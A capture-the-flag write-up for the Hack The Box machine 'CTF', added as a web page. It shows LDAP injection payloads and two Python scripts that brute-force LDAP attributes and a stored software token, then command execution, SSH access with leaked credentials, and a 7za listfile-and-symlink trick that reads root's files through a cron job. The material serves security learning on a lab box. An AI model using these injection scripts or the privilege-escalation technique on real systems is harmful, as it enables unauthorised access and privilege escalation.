@@ -1,0 +1,338 @@
+---
+layout: default
+title: CTF
+---
+
+<h1>CTF</h1>
+<p class="date">20/07/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/ctf.png">
+
+<p><code>CTF</code> is a really interesting box that requires exploiting an LDAP injection vulnerability to be able to use a one time password system to obtain a shell. Then, to get the root flag, abuse a <code>7za</code> functionality to read files as another user.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>We'll start running a <code>nmap</code> to see we only have port <code>22/ssh</code> and <code>80/http</code> open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/ctf# nmap -sC -sV 10.10.10.122
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 06:09 EDT
+Nmap scan report for 10.10.10.122
+Host is up (0.069s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
+|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
+|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: CTF
+</pre>
+
+<p>If we visit the website in port <code>80</code> we see the following text.</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/1.png">
+
+<p>Any kind of bruteforcing enumeration tool such as <code>gobuster</code> or <code>wfuzz</code> won't work here or would take too much to run. Anyway, we don't need those here.</p>
+
+<p>Going to the login site will take us to this form.</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/2.png">
+
+<p>Trying any random username gives this message, which could mean we can enumerate users.</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/3.png">
+
+<p>On the source code of the login page we have the following comment.</p>
+
+<pre class="prettyprint">
+&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) -->
+&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) -->
+</pre>
+
+<p>A token string with 81 digits? After some googling, we can find some sites talking about a similar token, in the <a href="https://manpages.debian.org/testing/stoken/stoken.1.en.html" target="_blank">stoken manpage</a> for example.</p>
+
+<p class="challenge-description">Pure numeric (81-digit) "ctf" (compressed token format) strings,...</p>
+
+<p>Yep, <b>CTF</b> like the machine box, we're going the right way.</p>
+
+<p>How the comment also speaks about <i>attributes</i> and the creator of the box is also the creator of <a href="lightweight" target="_blank"><code>lightweight</code></a>, the login probably uses <code>ldap</code> to authenticate users.</p>
+
+<p>If we use the character <code>*</code> URL encoded (<code>%2A</code>) on the username field, we get the following message, which probably means we have an ldap injection vulnerability in the login and the application thought it was a valid user.</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/4.png">
+
+<p><b>Note:</b> the application URL encodes the username before sending it, so if we work with <code>burp</code> for example, we have to URL encode it two times (<code>%252A</code>).</p>
+
+<p>The comment we saw before said the token is stored in an already existent attribute, so first we need to know which one is it. To do that we're going to use a variant of a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" target="_blank">PayloadAllTheThings</a> payload: <code>*)(uid=*))(|(uid=*</code> and change <code>uid</code> for <a href="https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html" target="_blank">other attributes</a>, if the response says 'Cannot login', means the attribute exists. I automated the process with the following script.</p>
+
+<pre class="prettyprint">
+import requests
+import time
+import urllib.parse
+
+attrs = ["buildingname","c","cn","co","comment","commonname","company","description","distinguishedname","dn","department","displayname","facsimiletelephonenumber","fax","friendlycountryname","givenname","homephone","homepostaladdress","info","initials","ipphone","l","mail","mailnickname","rfc822mailbox","mobile","mobiletelephonenumber","name","othertelephone","ou","pager","pagertelephonenumber","physicaldeliveryofficename","postaladdress","postalcode","postofficebox","samaccountname","serialnumber","sn","surname","st","stateorprovincename","street","streetaddress","telephonenumber","title","uid","url","userprincipalname","wwwhomepage"]
+url = "http://10.10.10.122/login.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+for attr in attrs:
+	time.sleep(1)
+	payload = '*)(' + attr + '=*))(|(' + attr + '=*'
+	username = urllib.parse.quote(urllib.parse.quote(payload))
+	data = "inputUsername=" + username + "&inputOTP=123"
+	r = requests.post(url, data=data, headers=headers)
+	if b'Cannot login' in r.content:
+		print(attr + ' exists!')
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/ctf# python3 attrme.py 
+cn exists!
+commonname exists!
+mail exists!
+rfc822mailbox exists!
+name exists!
+pager exists!
+pagertelephonenumber exists!
+sn exists!
+surname exists!
+uid exists!
+</pre>
+
+<p>Now that we know the available attributes, we're going to dump the values of each one using the same payload <code>*)(ATTR=*))(|(ATTR=VALUE*</code>, but now bruteforcing all possible characters.</p>
+
+<pre class="prettyprint">
+import requests
+import time
+import urllib.parse
+
+
+chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-/@+"
+url = "http://10.10.10.122/login.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+attrs = ["cn", "commonname", "mail", "rfc822mailbox", "name", "pager", "pagertelephonenumber", "sn", "surname", "uid"] 
+
+for attr in attrs:
+	print('[+] Dumping ' + attr + ': ')
+	next = False
+	val = ""
+	while not next:
+		for i, c in enumerate(chars):
+			time.sleep(1)
+			payload = '*)(' + attr + '=*))(|(' + attr + '=' + val + c + '*'
+			username = urllib.parse.quote(urllib.parse.quote(payload))
+			data = "inputUsername=" + username + "&inputOTP=123"
+			r = requests.post(url, data=data, headers=headers)
+			if b'Cannot login' in r.content:
+				val += c
+				print(val)
+				break
+			if i == len(chars) - 1:
+				next = True
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/ctf# python3 valueme.py 
+[+] Dumping cn: 
+l
+...
+ldapuser
+[+] Dumping commonname: 
+l
+...
+ldapuser
+[+] Dumping mail: 
+l
+...
+ldapuser@ctf
+[+] Dumping rfc822mailbox: 
+l
+...
+ldapuser@ctf
+[+] Dumping name: 
+l
+...
+ldapuser
+[+] Dumping pager: 
+2
+28
+...
+28544949001135715653165154565233557071316741144572714060417214145671110271671700
+285449490011357156531651545652335570713167411445727140604172141456711102716717000
+[+] Dumping pagertelephonenumber: 
+2
+28
+...
+28544949001135715653165154565233557071316741144572714060417214145671110271671700
+285449490011357156531651545652335570713167411445727140604172141456711102716717000
+[+] Dumping sn: 
+l
+...
+ldapuser
+[+] Dumping surname: 
+l
+...
+ldapuser
+[+] Dumping uid: 
+l
+...
+ldapuser
+</pre>
+
+<p>Now that we have the CTF token, we can use the tool <a href="https://github.com/cernekee/stoken" target="_blank"><code>stoken</code></a> to generate One Time Passwords (<code>OTP</code>).</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/ctf# stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
+Enter new password: 
+Confirm new password: 
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/ctf# stoken tokencode
+Enter PIN:
+PIN must be 4-8 digits.  Use '0000' for no PIN.
+Enter PIN: 0000
+53373465
+</pre>
+
+<p>Using this <code>OTP</code> and the user <code>%2A</code> we can login, being redirected to <code>/page.php</code> where we have the following form.</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/5.png">
+
+<p>Trying to execute anything will prompt us this error.</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/6.png">
+
+<p>We just have to use <code>*)(uid=*))(|(uid=*</code> (<code>%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A</code>) as username instead. Then we will be logged in as a valid user and we'll be able to execute commands.</p>
+
+<img class="img-fluid" src="/static/img/htb/ctf/7.png">
+
+<p>Check what we have on the current folder using <code>ls -la</code>.</p>
+
+<pre class="prettyprint">
+drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
+drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
+-rw-r--r--. 1 root   root      0 May 19 22:34 banned.txt
+-rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
+drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
+drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
+-rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
+drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
+-rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
+-rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
+-rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
+-rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
+drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
+</pre>
+
+<p>If we inspect the code of <code>page.php</code> we can see the following credentials.</p>
+
+<pre class="prettyprint">
+...
+$username = 'ldapuser';
+$password = 'e398e27d5c4ad45086fe431120932a01';
+...
+</pre>
+
+<p>Now we can connect via <code>ssh</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/ctf# ssh ldapuser@10.10.10.122
+ldapuser@10.10.10.122's password: e398e27d5c4ad45086fe431120932a01
+[ldapuser@ctf ~]$ 
+</pre>
+
+<p>We can read the user flag on <code>ldapuser</code> home directory.</p>
+
+<pre class="prettyprint">
+[ldapuser@ctf ~]$ cat user.txt
+<span flag="74a8e86f3f6ecd8010a660cfb44ee585">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>After some enumeration we can find the following files owned by <code>root</code> in <code>/backup</code>.</p>
+
+<pre class="prettyprint">
+[ldapuser@ctf backup]$ ls -la
+total 52
+drwxr-xr-x.  2 root root 4096 May 19 22:45 .
+dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
+-rw-r--r--.  1 root root   32 May 19 22:35 backup.1558298101.zip
+-rw-r--r--.  1 root root   32 May 19 22:36 backup.1558298161.zip
+-rw-r--r--.  1 root root   32 May 19 22:37 backup.1558298221.zip
+-rw-r--r--.  1 root root   32 May 19 22:38 backup.1558298281.zip
+-rw-r--r--.  1 root root   32 May 19 22:39 backup.1558298341.zip
+-rw-r--r--.  1 root root   32 May 19 22:40 backup.1558298401.zip
+-rw-r--r--.  1 root root   32 May 19 22:41 backup.1558298461.zip
+-rw-r--r--.  1 root root   32 May 19 22:42 backup.1558298521.zip
+-rw-r--r--.  1 root root   32 May 19 22:43 backup.1558298581.zip
+-rw-r--r--.  1 root root   32 May 19 22:44 backup.1558298641.zip
+-rw-r--r--.  1 root root   32 May 19 22:45 backup.1558298701.zip
+-rw-r--r--.  1 root root    0 May 19 22:45 error.log
+-rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh
+</pre>
+
+<p>The file <code>honeypot.sh</code> seems to be executing as a cron job and zipping the files of <code>/var/www/html/uploads</code> and storing them here.</p>
+
+<pre class="prettyprint">
+[ldapuser@ctf backup]$ cat honeypot.sh 
+# get banned ips from fail2ban jails and update banned.txt
+# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
+/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt
+# awk '$1=$1' ORS='&lt;br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt
+
+# some vars in order to be sure that backups are protected
+now=$(date +"%s")
+filename="backup.$now"
+pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')
+
+# keep only last 10 backups
+cd /backup
+ls -1t *.zip | tail -n +11 | xargs rm -f
+
+# get the files from the honeypot and backup 'em all
+cd /var/www/html/uploads
+7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+
+# cleaup the honeypot
+rm -rf -- *
+
+# comment the next line to get errors for debugging
+truncate -s 0 /backup/error.log
+</pre>
+
+<p>What looks interesting here is the <code>7za</code> instruction which compresses the files. If we check the documentation we can see there's the option to tell 7za to read the files to compress from the content of another file if we use <code>@</code> on the filename.</p>
+
+<p class="challenge-description">
+7za &lt;command> [&lt;switches>... ] &lt;archive_name> [&lt;file_names>... ] [&lt;@listfiles>... ]
+</p>
+
+<p>We can abuse this to read files as the user who is running this script. We just have to create a file with the <code>@</code> symbol and another one that points to the file we want to read, <code>/root/root.txt</code> in our case.</p>
+
+<pre class="prettyprint">
+[ldapuser@ctf html]$ touch uploads/@root.txt
+[ldapuser@ctf html]$ ln -s /root/root.txt uploads/root.txt
+</pre>
+
+<p>When the script is executed, it reads the contents of <code>/root/root.txt</code> and logs them on <code>error.log</code> but truncates the file afterwards, so we have to be reading the file using <code>tail -f</code> and we should get the flag.</p>
+
+<pre class="prettyprint">
+[ldapuser@ctf uploads]$ tail -f /backup/error.log 
+
+WARNING: No more files
+<span flag="fd6d2e53c995e6928cd0f040c79ba053">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+
+tail: /backup/error.log: file truncated
+</pre>
